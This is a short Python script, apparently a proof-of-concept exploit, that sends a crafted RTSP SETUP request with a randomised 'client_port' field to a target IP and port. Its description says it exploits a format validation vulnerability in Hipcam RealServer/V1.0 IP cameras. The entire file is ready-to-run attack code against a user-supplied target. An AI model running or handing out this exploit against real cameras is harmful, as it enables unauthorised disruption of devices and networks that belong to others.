import socket
import argparse
import random

def generate_random_data():
    # Generate a random value between 1024 and 65535 for the 'client_port' parameter
    return random.randint(1024, 65535)

def send_rtsp_request(ip, port):
    # Generate a random 'client_port' value
    random_data_value = generate_random_data()

    # Construct the RTSP URL with the target IP and port
    cam_address = f"rtsp://{ip}:{port}/11"

    # Craft the RTSP SETUP request with the manipulated 'client_port' parameter
    rtsp_request = f"SETUP {cam_address}/trackID=1 RTSP/1.0\r\nCSeq: 3\r\nTransport: RTP/AVP;unicast;client_port={random_data_value}\r\n\r\n"

    try:
        # Create a TCP socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Set a timeout for the socket connection
            s.settimeout(1)
            
            # Connect to the RTSP service on the target camera
            s.connect((ip, port))
            
            # Send the crafted RTSP request to the camera
            s.send(rtsp_request.encode())
    except Exception as e:
        # Handle any errors that may occur during the connection or request sending
        print(f"Error: {e}")

if __name__ == "__main__":
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Send RTSP SETUP request to exploit format validation vulnerability in the Hipcam RealServer/V1.0.")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("port", type=int, help="Target port number")

    # Extract IP and port from command-line arguments
    args = parser.parse_args()

    # Call the function to send the RTSP request with a randomly generated 'client_port' value
    send_rtsp_request(args.ip, args.port)
